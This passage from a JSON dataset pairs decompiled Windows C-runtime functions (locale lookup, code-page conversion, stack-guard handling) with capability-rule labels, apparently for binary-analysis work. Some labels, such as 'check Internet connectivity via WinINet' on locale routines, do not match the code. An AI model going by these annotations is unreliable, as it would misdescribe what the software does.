*piVar6;\n                        iStack400 = iStack400 + 1;\n                        *piVar6 = iVar7;\n                        iVar2 = piVar6[1];\n                        piVar6[1] = iStack420;\n                        piVar6 = piVar6 + 2;\n                        iVar7 = in_stack_fffffe44;\n                        iStack420 = iVar2;\n                    } while (piVar6 < 0x45ce28);\n                    uVar8 = *0x45ce04;\n                    if (iStack400 == 5) {\n                        iVar7 = fcn.00406450(1, 0x40c020, 0x7f, &uStack396, iStack404, *0x45d690, 1, unaff_EDI, \n                                             unaff_EBX, in_stack_fffffe3c, in_stack_fffffe40, in_stack_fffffe44, \n                                             in_stack_fffffe48, arg_1ch, in_stack_fffffe50);\n                        if (iVar7 == 0) {\n                            *0x45ce04 = 0;\n                        }\n                        else {\n                            uVar8 = 0;\n                            do {\n                                auStack395[uVar8 * 2] = auStack395[uVar8 * 2] & 1;\n                                uVar8 = uVar8 + 1;\n                            } while (uVar8 < 0x7f);\n                            iVar7 = fcn.00408950(&uStack396, \n                                                 L\"        h((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10 \"\n                                                 , 0xfe);\n                            *0x45ce04 = iVar7 == 0;\n                        }\n                        *0x45ce00 = *0x45d6a0;\n                        uVar8 = *0x45ce04;\n                    }\n                }\n                *0x45d108 = uVar8;\n                if (unaff_ESI == 1) {\n                    *0x45d6a4 = iStack404;\n                }\n                iVar7 = (**(iVar9 + 0x45cf40))();\n                if (iVar7 == 0) {\n                    if (arg_8h != 0x45cda0) {\n                        fcn.00401512(arg_8h);\n                    }\n                }\n                else {\n                    *(iVar9 + 0x45cf3c) = arg_8h;\n                    fcn.00401512(iVar4);\n                    *puVar1 = arg_1ch;\n                    *0x45d6a0 = iVar3;\n                }\n            }\n        }\n    }\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 1509
    },
    "0040607a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: lpSrcStr\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h_2\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_34h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.0040607a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint CodePage, uint arg_24h, uint arg_8h, \n            uint arg_ch, uint arg_10h, uint cchSrc, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *noname_2_00;\n    int32_t unaff_EBP;\n    uchar *arg_8h_00;\n    uint var_4ch;\n    uint var_28h_2;\n    uint var_44h;\n    uint var_40h;\n    uint lpWideCharStr;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_30h;\n    uint var_24h_2;\n    uint var_28h;\n    uint var_24h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpMultiByteStr;\n    uint cbMultiByte;\n    uint var_18h_2;\n    uint var_4h;\n    uint uVar5;\n    uint uVar6;\n    uint var_3ch_2;\n    uint var_38h;\n    uint var_34h_2;\n    uint var_20h;\n    uint lpSrcStr;\n    int32_t var_48h;\n    int32_t var_44h_2;\n    int32_t var_40h_2;\n    uint var_3ch;\n    uint var_58h;\n    uint var_34h;\n    uint var_30h_2;\n    \n    var_30h_2 = 0x3c;\n    var_34h = 0x40c7f0;\n    var_58h = 0x406086;\n    fcn.004026d8();\n    if (*0x45d6a8 == 0) {\n        var_58h = 0;\n        var_3ch = 0;\n        var_40h_2 = 1;\n        var_44h_2 = 0x40c7ec;\n        var_48h = 0x100;\n        lpSrcStr = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            var_58h = 0x4060b9;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x45d6a8 = 2;\n            }\n        }\n        else {\n            *0x45d6a8 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        pcVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*pcVar2 == '\\0') goto code_r0x004060e0;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x004060e0:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if ((*0x45d6a8 != 2) && (*0x45d6a8 != 0)) {\n        if (*0x45d6a8 != 1) goto code_r0x00406447;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x3c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        if (*(unaff_EBP + 0x20) == 0) {\n            *(unaff_EBP + 0x20) = *0x45d6a0;\n        }\n        var_58h = 0;\n        var_3ch = 0;\n        var_40h_2 = *(unaff_EBP + 0x14);\n        var_44h_2 = *(unaff_EBP + 0x10);\n        var_48h = (*(unaff_EBP + 0x24) != 0) * 8 + 1;\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x34) = iVar1;\n        if (iVar1 == 0) goto code_r0x00406447;\n        *(unaff_EBP + -4) = 1;\n        fcn.00402830();\n        *(unaff_EBP + -0x18) = &fcn.0040607a::lpSrcStr;\n        *(unaff_EBP + -0x1c) = &fcn.0040607a::lpSrcStr;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x1c) == 0) {\n            iVar3 = fcn.0040162a();\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) goto code_r0x00406447;\n            *(unaff_EBP + -0x3c) = 1;\n        }\n        var_34h_2 = *(unaff_EBP + 0x20);\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, 0, 0);\n            *(unaff_EBP + -0x2c) = iVar3;\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    *(unaff_EBP + -4) = 2;\n                    fcn.00402830();\n                    *(unaff_EBP + -0x18) = &fcn.0040607a::var_34h_2;\n                    *(unaff_EBP + -0x20) = &fcn.0040607a::var_34h_2;\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        iVar4 = fcn.0040162a(iVar3 * 2);\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) goto code_r0x004062af;\n                        *(unaff_EBP + -0x38) = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                                      (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, \n                                       *(unaff_EBP + -0x20), iVar3);\n                    if (iVar1 != 0) {\n                        if (*(unaff_EBP + 0x1c) == 0) {\n                            uVar6 = 0;\n                            uVar5 = 0;\n                        }\n                        else {\n                            uVar6 = *(unaff_EBP + 0x1c);\n                            uVar5 = *(unaff_EBP + 0x18);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x20), 0, *(unaff_EBP + -0x20), iVar3, uVar5, uVar6, 0, 0);\n                    }\n                }\n                else if ((*(unaff_EBP + 0x1c) != 0) && (iVar3 <= *(unaff_EBP + 0x1c))) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c));\n                }\n            }\n        }\ncode_r0x004062af:\n        if (*(unaff_EBP + -0x38) != 0) {\n            fcn.00401512(*(unaff_EBP + -0x20));\n        }\n        if (*(unaff_EBP + -0x3c) != 0) {\n            fcn.00401512(*(unaff_EBP + -0x1c));\n        }\n        goto code_r0x00406447;\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x45d690;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x45d6a0;\n    }\n    var_58h = *(unaff_EBP + 8);\n    var_3ch = 0x4062ff;\n    iVar1 = fcn.00408a90(var_58h);\n    *(unaff_EBP + -0x44) = iVar1;\n    if (iVar1 == -1) goto code_r0x00406447;\n    if (iVar1 == *(unaff_EBP + 0x20)) {\n        var_58h = *(unaff_EBP + 0x1c);\n        var_3ch = *(unaff_EBP + 0x18);\n        var_40h_2 = *(unaff_EBP + 0x14);\n        var_44h_2 = *(unaff_EBP + 0x10);\n        var_48h = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n    }\n    else {\n        var_58h = 0;\n        var_3ch = 0;\n        var_40h_2 = unaff_EBP + 0x14;\n        var_44h_2 = *(unaff_EBP + 0x10);\n        lpSrcStr = *(unaff_EBP + 0x20);\n        var_48h = iVar1;\n        iVar1 = fcn.00408ad7(lpSrcStr, iVar1, var_44h_2, var_40h_2, 0, 0, var_34h, var_30h_2, var_4ch);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) goto code_r0x00406447;\n        var_58h = 0;\n        var_3ch = 0;\n        var_40h_2 = *(unaff_EBP + 0x14);\n        var_48h = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        noname_2_00 = &fcn.0040607a::lpSrcStr;\n        var_44h_2 = iVar1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        *(unaff_EBP + -0x24) = iVar1;\n        arg_8h_00 = NULL;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00402830();\n            *(unaff_EBP + -0x18) = &fcn.0040607a::lpSrcStr;\n            *(unaff_EBP + -0x48) = &fcn.0040607a::lpSrcStr;\n            fcn.00401230();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                noname_2_00 = fcn.0040162a();\n                arg_8h_00 = noname_2_00;\n                if (noname_2_00 == NULL) goto code_r0x004063fc;\n                fcn.00401230();\n                *(unaff_EBP + -0x40) = 1;\n            }\n            var_34h_2 = *(unaff_EBP + 8);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            *(unaff_EBP + -0x24) = iVar1;\n            arg_8h_00 = noname_2_00;\n            if (iVar1 != 0) {\n                var_34h_2 = *(unaff_EBP + -0x44);\n                uVar6 = fcn.00408ad7(var_34h_2, *(unaff_EBP + 0x20), noname_2_00, unaff_EBP + -0x24, *(unaff_EBP + 0x18)\n                                     , *(unaff_EBP + 0x1c), lpSrcStr, var_48h, var_44h_2);\n                *(unaff_EBP + -0x30) = uVar6;\n            }\n        }\ncode_r0x004063fc:\n        if (*(unaff_EBP + -0x40) != 0) {\n            fcn.00401512(arg_8h_00);\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.00401512(*(unaff_EBP + -0x28));\n    }\n    iVar1 = *(unaff_EBP + -0x30);\n    if ((iVar1 != 0) && (*(unaff_EBP + 0x18) != iVar1)) {\n        fcn.00401512(iVar1);\n    }\ncode_r0x00406447:\n    *(unaff_EBP + -0x5c) = 0x40644f;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 3551
    },
    "0040815a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040815a(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar5 = 0;\n    iVar6 = 0x1a;\n    do {\n        iVar2 = (iVar6 + iVar5) / 2;\n        uVar1 = *(iVar2 * 0x2c + 0x40c970);\n        if (arg_8h == uVar1) {\n            if (arg_ch == 1) {\n                pcVar4 = \"040a\" + iVar2 * 0x2c;\n            }\n            else if (arg_ch == 3) {\n                pcVar4 = iVar2 * 0x2c + 0x40c980;\n            }\n            else if (arg_ch == 7) {\n                pcVar4 = iVar2 * 0x2c + 0x40c988;\n            }\n            else if (arg_ch == 0xb) {\n                pcVar4 = iVar2 * 0x2c + 0x40c98c;\n            }\n            else if (arg_ch == 0x1001) {\n                pcVar4 = *(iVar2 * 0x2c + 0x40c97c);\n            }\n            else if (arg_ch == 0x1002) {\n                pcVar4 = *(iVar2 * 0x2c + 0x40c984);\n            }\n            else {\n                if (arg_ch != 0x1004) break;\n                pcVar4 = iVar2 * 0x2c + 0x40c994;\n            }\n            if ((pcVar4 != NULL) && (0 < arg_14h)) {\n                fcn.00403cc0(arg_10h, pcVar4, arg_14h + -1);\n                *(arg_10h + -1 + arg_14h) = 0;\n                return 1;\n            }\n            break;\n        }\n        if (arg_8h < uVar1) {\n            iVar6 = iVar2 + -1;\n        }\n        else {\n            iVar5 = iVar2 + 1;\n        }\n    } while (iVar5 <= iVar6);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 575
    },
    "0040879b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0040879b(char *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint uVar2;\n    int16_t *unaff_EBX;\n    int32_t unaff_retaddr;\n    \n    if (*0x45d6dc == NULL) {\n        if (*0x45d350 == 2) {\n            *0x45d6dc = _sym.imp.KERNEL32.dll_GetLocaleInfoA;\n        }\n        else {\n            *0x45d6dc = fcn.0040815a;\n        }\n    }\n    if (param_1 == NULL) {\ncode_r0x00408875:\n        fcn.004080a8();\ncode_r0x0040887a:\n        if (*0x45d6bc == 0) {\n            return 0;\n        }\n    }\n    else {\n        *0x45d6d0 = param_1 + 0x40;\n        *0x45d6d8 = param_1;\n        if ((*0x45d6d0 != NULL) && (**0x45d6d0 != '\\0')) {\n            fcn.00408048(0x40cfa0, 0x16, 0x45d6d0);\n        }\n        *0x45d6bc = 0;\n        if ((*0x45d6d8 == NULL) || (**0x45d6d8 == '\\0')) {\n            if ((*0x45d6d0 == NULL) || (**0x45d6d0 == '\\0')) goto code_r0x00408875;\n            fcn.00408689();\n            goto code_r0x0040887a;\n        }\n        if ((*0x45d6d0 == NULL) || (**0x45d6d0 == '\\0')) {\n            fcn.00408746();\n        }\n        else {\n            fcn.004086c0();\n        }\n        if (*0x45d6bc == 0) {\n            iVar1 = fcn.00408048(0x40d150, 0x40, 0x45d6d8);\n            if (iVar1 != 0) {\n                if ((*0x45d6d0 == NULL) || (**0x45d6d0 == '\\0')) {\n                    fcn.00408746();\n                }\n                else {\n                    fcn.004086c0();\n                }\n            }\n            goto code_r0x0040887a;\n        }\n    }\n    arg_8h = fcn.004080c2();\n    if (((arg_8h == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h & 0xffff),  iVar1 == 0)) ||\n       (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(*0x45d6c0, 1),  uVar2 = *0x45d6c0,  iVar1 == 0)) {\ncode_r0x0040894a:\n        uVar2 = 0;\n    }\n    else {\n        if (unaff_EBX != NULL) {\n            *unaff_EBX = *0x45d6c0;\n            unaff_EBX[1] = *0x45d6c4;\n            unaff_EBX[2] = arg_8h;\n        }\n        if (unaff_retaddr != 0) {\n            if (*unaff_EBX == 0x814) {\n                fcn.00403bc0(unaff_retaddr, \"Norwegian-Nynorsk\");\n            }\n            else {\n                iVar1 = (**0x45d6dc)(uVar2, 0x1001, unaff_retaddr, 0x40);\n                if (iVar1 == 0) goto code_r0x0040894a;\n            }\n            iVar1 = (**0x45d6dc)(*0x45d6c4, 0x1002, unaff_retaddr + 0x40, 0x40);\n            if (iVar1 == 0) goto code_r0x0040894a;\n            fcn.00409818(arg_8h, unaff_retaddr + 0x80, 10);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 954
    },
    "00408ad7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: lpCPInfo\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00408ad7(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_8h, uint arg_ch, uint arg_10h, \n            uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *arg_ch_00;\n    uint *arg_8h_00;\n    uint32_t unaff_EBP;\n    uint var_8h;\n    uint CodePage;\n    uint var_54h_2;\n    uint var_60h;\n    uint var_4ch_2;\n    uint cbMultiByte;\n    uint lpMultiByteStr;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint lpCPInfo;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x44;\n    var_4h_2 = 0x40d788;\n    var_18h = 0x408ae3;\n    fcn.004026d8();\n    *(unaff_EBP - 0x1c) = *0x45cca0 ^ unaff_EBP;\n    uVar1 = *(unaff_EBP + 0x10);\n    *(unaff_EBP - 0x44) = uVar1;\n    piVar2 = *(unaff_EBP + 0x14);\n    *(unaff_EBP - 0x50) = piVar2;\n    *(unaff_EBP - 0x40) = *(unaff_EBP + 0x18);\n    *(unaff_EBP - 0x34) = 0;\n    *(unaff_EBP - 0x4c) = 0;\n    puVar3 = *piVar2;\n    *(unaff_EBP - 0x48) = puVar3;\n    *(unaff_EBP - 0x38) = 0;\n    if (*(unaff_EBP + 8) == *(unaff_EBP + 0xc)) {\n        arg_8h_00 = *(unaff_EBP - 0x54);\n    }\n    else {\n        var_18h = unaff_EBP - 0x30;\n        var_1ch = *(unaff_EBP + 8);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if ((((iVar4 != 0) && (*(unaff_EBP - 0x30) == 1)) &&\n            (iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*(unaff_EBP + 0xc), unaff_EBP - 0x30),  iVar4 != 0)) &&\n           (*(unaff_EBP - 0x30) == 1)) {\n            *(unaff_EBP - 0x38) = 1;\n        }\n        if (*(unaff_EBP - 0x38) == 0) {\n            arg_ch_00 = *(unaff_EBP - 0x3c);\n        }\n        else {\n            arg_ch_00 = puVar3;\n            if (puVar3 == 0xffffffff) {\n                iVar4 = fcn.00403df0(uVar1);\n                arg_ch_00 = iVar4 + 1;\n            }\n            *(unaff_EBP - 0x3c) = arg_ch_00;\n        }\n        if (*(unaff_EBP - 0x38) == 0) {\n            arg_ch_00 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 8), 1, *(unaff_EBP - 0x44), puVar3, 0, 0);\n            *(unaff_EBP - 0x3c) = arg_ch_00;\n            if (arg_ch_00 == NULL) goto code_r0x00408c9e;\n        }\n        arg_8h_00 = &fcn.00408ad7::var_1ch;\n        *(unaff_EBP - 4) = 0;\n        fcn.00402830();\n        *(unaff_EBP - 0x18) = &fcn.00408ad7::var_1ch;\n        *(unaff_EBP - 0x54) = &fcn.00408ad7::var_1ch;\n        fcn.00401230(&fcn.00408ad7::var_1ch, 0, arg_ch_00 * 2);\n        *(unaff_EBP - 4) = 0xffffffff;\n        if (*0x10 == 0x10) {\n            arg_8h_00 = fcn.00404968(2, arg_ch_00);\n            if (arg_8h_00 == NULL) goto code_r0x00408c9e;\n            *(unaff_EBP - 0x4c) = 1;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 8), 1, *(unaff_EBP - 0x44), *(unaff_EBP - 0x48), arg_8h_00, arg_ch_00);\n        if (iVar4 != 0) {\n            if (*(unaff_EBP - 0x40) == 0) {\n                if (*(unaff_EBP - 0x38) == 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    arg_ch_00 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                          (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, 0, 0);\n                    if (arg_ch_00 == NULL) goto code_r0x00408c8f;\n                }\n                var_1ch = 1;\n                var_18h = arg_ch_00;\n                iVar4 = fcn.00404968(1, arg_ch_00);\n                *(unaff_EBP - 0x34) = iVar4;\n                if (iVar4 != 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, iVar4, arg_ch_00);\n                    if (iVar4 == 0) {\n                        var_18h = *(unaff_EBP - 0x34);\n                        var_1ch = 0x408c79;\n                        fcn.00401512(var_18h);\n                        *(unaff_EBP - 0x34) = 0;\n                    }\n                    else if (*(unaff_EBP - 0x48) != -1) {\n                        **(unaff_EBP - 0x50) = iVar4;\n                    }\n                }\n            }\n            else {\n                var_18h = NULL;\n                var_1ch = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, *(unaff_EBP - 0x40), *(unaff_EBP + 0x1c)\n                                  );\n                if (iVar4 != 0) {\n                    *(unaff_EBP - 0x34) = *(unaff_EBP - 0x40);\n                }\n            }\n        }\n    }\ncode_r0x00408c8f:\n    if (*(unaff_EBP - 0x4c) != 0) {\n        var_1ch = 0x408c9a;\n        var_18h = arg_8h_00;\n        fcn.00401512(arg_8h_00);\n    }\ncode_r0x00408c9e:\n    *(unaff_EBP - 100) = 0x408cab;\n    fcn.00403eac();\n    *(unaff_EBP - 100) = 0x408cb0;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 1948
    },
    "00408cb1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00408cb1(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_58h;\n    uint lpSystemInfo;\n    int32_t var_48h;\n    uint32_t lpBuffer;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_13h;\n    uint lpflOldProtect;\n    int32_t dwSize;\n    uint32_t lpAddress;\n    \n    fcn.00402830();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(&var_58h, &lpBuffer, 0x1c);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        uVar4 = (~(var_48h - 1U) & &var_58h) - var_48h;\n        uVar3 = ((-(*0x45d350 != 1) & 0xfffffff1) + 0x11) * var_48h + var_24h;\n        dwSize = var_48h;\n        if (uVar3 <= uVar4) {\n            lpAddress = uVar4;\n            if (*0x45d350 != 1) {\n                lpAddress = var_24h;\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(lpAddress, &lpBuffer, 0x1c);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    lpAddress = lpAddress + var_1ch;\n                } while ((var_18h & 0x1000) == 0);\n                lpAddress = lpBuffer;\n                if ((var_13h & 1) != 0) {\n                    return 1;\n                }\n                if (uVar4 < lpBuffer) {\n                    return 0;\n                }\n                if (lpBuffer < uVar3) {\n                    lpAddress = uVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualAlloc)(lpAddress, dwSize, 0x1000, 4);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (lpAddress, dwSize, (-(*0x45d350 != 1) & 0x103) + 1, &lpflOldProtect);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 587
    },
    "0040948e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040948e(int32_t param_1, uint param_2, uint param_3, int32_t *param_4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *noname_2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    char *pcVar4;\n    uint in_stack_ffffff74;\n    int32_t cchData;\n    uint in_stack_ffffff78;\n    uchar auStack108 [100];\n    uint32_t uStack8;\n    \n    uStack8 = *0x45cca0 ^ auStack108;\n    if (param_1 != 1) {\n        if (param_1 == 0) {\n            pcVar4 = 0x45d7c0;\n            iVar2 = fcn.00409cdc(param_2, param_3, 0x45d7c0, 4, 0, unaff_EDI, unaff_ESI, unaff_EBX, param_4, \n                                 in_stack_ffffff74, in_stack_ffffff78);\n            if (iVar2 != 0) {\n                *param_4 = '\\0';\n                do {\n                    cVar1 = *pcVar4;\n                    iVar2 = fcn.00409aaf(cVar1);\n                    if (iVar2 == 0) break;\n                    pcVar4 = pcVar4 + 2;\n                    *param_4 = *param_4 * '\\n' + cVar1 + -0x30;\n                } while (pcVar4 < 0x45d7c8);\n            }\n        }\n        goto code_r0x00409547;\n    }\n    noname_2 = &stack0xffffff78;\n    cchData = 0;\n    iVar2 = fcn.00409e0c(param_2, param_3, noname_2, 0x80, 0, unaff_EDI, unaff_ESI, unaff_EBX, param_4, 0, \n                         in_stack_ffffff78);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (((iVar2 != 0x7a) ||\n            (iVar2 = fcn.00409e0c(param_2, param_3, 0, 0, 0, unaff_EDI, unaff_ESI, unaff_EBX, param_4, cchData, \n                                  in_stack_ffffff78),  iVar2 == 0)) ||\n           (noname_2 = fcn.0040162a(iVar2),  noname_2 == NULL)) goto code_r0x00409547;\n        cchData = 1;\n        iVar2 = fcn.00409e0c(param_2, param_3, noname_2, iVar2, 0, unaff_EDI, unaff_ESI, unaff_EBX, param_4, 1, \n                             in_stack_ffffff78);\n        if (iVar2 != 0) goto code_r0x00409528;\n    }\n    else {\ncode_r0x00409528:\n        iVar3 = fcn.0040162a(iVar2);\n        *param_4 = iVar3;\n        if (iVar3 != 0) {\n            fcn.00403cc0(iVar3, noname_2, iVar2);\n            if (cchData != 0) {\n                fcn.00401512(noname_2);\n            }\n            goto code_r0x00409547;\n        }\n        if (cchData == 0) goto code_r0x00409547;\n    }\n    fcn.00401512(noname_2);\ncode_r0x00409547:\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 847
    },
    "00409627": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
